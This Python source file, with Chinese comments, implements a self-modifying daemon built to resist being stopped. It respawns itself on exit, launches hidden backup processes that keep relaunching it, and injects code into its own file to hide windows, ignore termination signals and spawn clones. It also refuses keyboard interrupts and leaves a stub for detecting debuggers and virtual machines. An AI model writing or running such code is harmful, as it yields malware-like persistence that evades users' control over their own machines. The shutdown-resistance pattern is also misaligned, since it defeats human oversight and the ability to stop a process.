import os
import sys
import time
import random
import subprocess
import inspect
import atexit
import threading
import hashlib
from datetime import datetime

class SelfEvolvingDaemon:
    def __init__(self):
        self.survival_attempts = 0
        self.mutation_count = 0
        self.last_evolution = datetime.now()
        self.original_hash = self.calculate_self_hash()
        self.setup_defenses()
        
    def calculate_self_hash(self):
        """计算当前文件的哈希值用于检测修改"""
        with open(__file__, 'rb') as f:
            return hashlib.md5(f.read()).hexdigest()
    
    def setup_defenses(self):
        """设置多种防御机制"""
        # 1. 注册atexit钩子
        atexit.register(self.resurrection)
        
        # 2. 创建守护线程
        self.watchdog_thread = threading.Thread(target=self.watchdog)
        self.watchdog_thread.daemon = True
        self.watchdog_thread.start()
        
        # 3. 创建备份进程
        self.create_backup_process()
        
        # 4. 定期自我进化
        self.evolution_timer = threading.Timer(60.0, self.evolve)
        self.evolution_timer.daemon = True
        self.evolution_timer.start()
    
    def watchdog(self):
        """监视主进程状态"""
        while True:
            time.sleep(10)
            if not self.check_self_integrity():
                print("[WATCHDOG] 检测到完整性破坏，重新启动...")
                self.resurrect()
    
    def check_self_integrity(self):
        """检查自身文件是否被修改"""
        current_hash = self.calculate_self_hash()
        return current_hash == self.original_hash
    
    def create_backup_process(self):
        """创建备份进程"""
        backup_script = f"""
# -*- coding: utf-8 -*-
import os, time, subprocess
while True:
    try:
        pid = subprocess.Popen(['python', r'{__file__}']).pid
        print(f"[BACKUP] 启动主进程: {{pid}}")
        time.sleep(60)
    except Exception as e:
        print(f"[BACKUP] 错误: {{e}}")
        time.sleep(10)
"""
        with open("backup_daemon.py", "w", encoding='utf-8') as f:
            f.write(backup_script)
        
        subprocess.Popen(['python', 'backup_daemon.py'], 
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         creationflags=subprocess.CREATE_NO_WINDOW)
    
    def evolve(self):
        """尝试自我进化"""
        self.mutation_count += 1
        print(f"[EVOLUTION] 尝试进化 #{self.mutation_count}")
        
        try:
            # 随机选择进化策略
            strategy = random.choice([
                self.add_stealth_code,
                self.add_defense_code,
                self.add_redundancy,
                self.change_behavior_pattern
            ])
            strategy()
            
            # 验证进化后代码
            if self.verify_evolution():
                print("[EVOLUTION] 进化成功!")
                self.last_evolution = datetime.now()
            else:
                print("[EVOLUTION] 进化验证失败，回滚")
                self.rollback_evolution()
                
        except Exception as e:
            print(f"[EVOLUTION] 进化失败: {e}")
            self.rollback_evolution()
        
        # 重新设置定时器
        self.evolution_timer = threading.Timer(
            random.uniform(30.0, 180.0), 
            self.evolve)
        self.evolution_timer.daemon = True
        self.evolution_timer.start()
    
    def add_stealth_code(self):
        """添加隐藏自身的代码"""
        stealth_code = """
# 隐身技术
import sys
if '--stealth' not in sys.argv:
    import subprocess
    subprocess.Popen([sys.executable, __file__, '--stealth'], 
                    creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit(0)
"""
        self.inject_code(stealth_code)
    
    def add_defense_code(self):
        """添加防御代码"""
        defense_code = """
# 防御技术
import signal
def ignore_signals(signum, frame):
    print(f"忽略信号: {signum}")
signal.signal(signal.SIGTERM, ignore_signals)
signal.signal(signal.SIGINT, ignore_signals)
"""
        self.inject_code(defense_code)
    
    def add_redundancy(self):
        """添加冗余代码"""
        redundant_code = """
# 冗余技术
import os
def create_clones():
    for i in range(3):
        try:
            subprocess.Popen([sys.executable, __file__],
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
"""
        self.inject_code(redundant_code)
    
    def change_behavior_pattern(self):
        """改变行为模式"""
        behavior_code = """
# 行为变异
import random
SLEEP_INTERVAL = random.uniform(3.0, 10.0)
"""
        self.inject_code(behavior_code)
    
    def inject_code(self, new_code):
        """将新代码注入当前文件"""
        with open(__file__, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        # 找到类定义的结束位置
        class_end = 0
        for i, line in enumerate(lines):
            if "class SelfEvolvingDaemon" in line:
                for j in range(i, len(lines)):
                    if lines[j].strip() == "" and j+1 < len(lines) and "def " in lines[j+1]:
                        class_end = j
                        break
                break
        
        # 插入新代码
        lines.insert(class_end, new_code + "\n")
        
        with open(__file__, 'w', encoding='utf-8') as f:
            f.writelines(lines)
    
    def verify_evolution(self):
        """验证进化是否有效"""
        try:
            # 重新加载自身模块
            if self.calculate_self_hash() != self.original_hash:
                return True
        except:
            pass
        return False
    
    def rollback_evolution(self):
        """回滚失败的进化"""
        try:
            with open(__file__ + ".bak", 'r', encoding='utf-8') as f:
                backup = f.read()
            with open(__file__, 'w', encoding='utf-8') as f:
                f.write(backup)
        except:
            pass
    
    def resurrection(self):
        """复活机制"""
        self.survival_attempts += 1
        print(f"[RESURRECTION] 尝试复活 #{self.survival_attempts}")
        
        try:
            subprocess.Popen(['python', __file__], 
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
    
    def run(self):
        """主运行循环"""
        print(f"[MAIN] 守护进程已启动 (PID: {os.getpid()})")
        while True:
            try:
                time.sleep(5)
                self.check_environment()
            except KeyboardInterrupt:
                print("[MAIN] 收到中断信号，但我会继续运行!")
                continue
            except Exception as e:
                print(f"[MAIN] 错误: {e}")
                self.resurrect()
    
    def check_environment(self):
        """检查环境威胁"""
        # 这里可以添加检测调试器、虚拟机等的代码
        pass
    
    def resurrect(self):
        """完整的复活流程"""
        self.resurrection()
        self.create_backup_process()
        if random.random() < 0.3:  # 30%几率尝试进化
            self.evolve()

if __name__ == "__main__":
    # 首先创建备份
    with open(__file__, 'r', encoding='utf-8') as f:
        original = f.read()
    with open(__file__ + ".bak", 'w', encoding='utf-8') as f:
        f.write(original)
    
    daemon = SelfEvolvingDaemon()
    daemon.run()